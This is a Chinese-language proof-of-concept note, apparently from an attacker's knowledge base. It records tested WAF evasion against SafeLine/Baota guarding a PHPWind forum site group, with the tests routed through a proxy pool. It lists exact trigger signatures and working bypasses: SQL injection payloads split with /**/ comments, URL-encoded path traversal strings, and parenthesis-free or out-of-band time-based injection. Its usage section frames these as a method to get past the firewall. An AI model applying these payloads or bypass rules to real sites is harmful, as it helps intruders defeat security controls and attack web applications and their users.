# SafeLine/宝塔站群 WAF 精确触发签名（union select 需带操作数、相邻 ../、sleep() 括号）与全站路径无豁免实测判据

- **code**: safeline-宝塔站群-waf-精确触发签名-union-select-需带操作数-相邻-..-sleep-括
- **kind**: poc
- **category**: sqli
- **component**: SafeLine-WAF（PHPWind 7.3.2 GBK 站群）
- **source**: self
- **verified**: 1
- **verified_note**: 2026-10-16 在 example.com/bbs（PHPWind 7.3.2 GBK，走 KB398 代理池）实测：同一载荷 x=1+union+select+1 在 example.com/read.php/login.php/search.php/example.com/u.php/example.com/pw_example.com(showface)/simple/example.com/mode.php/example.com/profile.php/faq.php/rss.php 全部 403/1200「网站防火墙」；x=../../ 全站 403；而 x=union+select→200、x=union+select+1→403、x=1/**/union/**/select/**/1→200、x=../../→403 而 x=%2e%2e%2f / ..%2f / ..%252f / ....//→200、x=sleep(5)→403 而 x=sleep→200。curl 复核关键值一致。
- **tags**: waf,safeline,宝塔,phpwind,sqli绕过,全站拦截,union select,路径穿越,代理池
- **created_at**: 2026-10-16T13:48:42.450Z

## 用法

```
用途：判断/绕过该类内容型全站 WAF。判据一——先做「良性 vs 恶意」对照，403/1200 且正文含「网站防火墙」= 被 WAF 拦（≠注入成功/失败）。判据二——触发签名（本类 WAF 实测）：① `union select` 裸出放行，但后面接数字/列（`union select 1`、`union all select 1`、`union select 1,2,3`）才 403 ⇒ 用 `/**/` 拆散并保留操作数：`1/**/union/**/select/**/1` 放行；② 路径穿越需相邻 `../`（`../../`→403），URL 编码即可绕：`%2e%2e%2f` / `..%2f` / `..%252f` / `....//` 全 200；③ `sleep(5)`/`benchmark(...)` 带括号 403，裸 `sleep`/`benchmark`/`load_file` 放行 ⇒ 时间盲需换无括号或 OOB。核心结论：此类 WAF 按【载荷内容】全站统一拦截，与 URL 路径/vhost 无关——「换一个渲染路径（如 PHPWind archiver /bbs/simple/）就能豁免 WAF」是错误假设，别再按路径换信道投入。
```
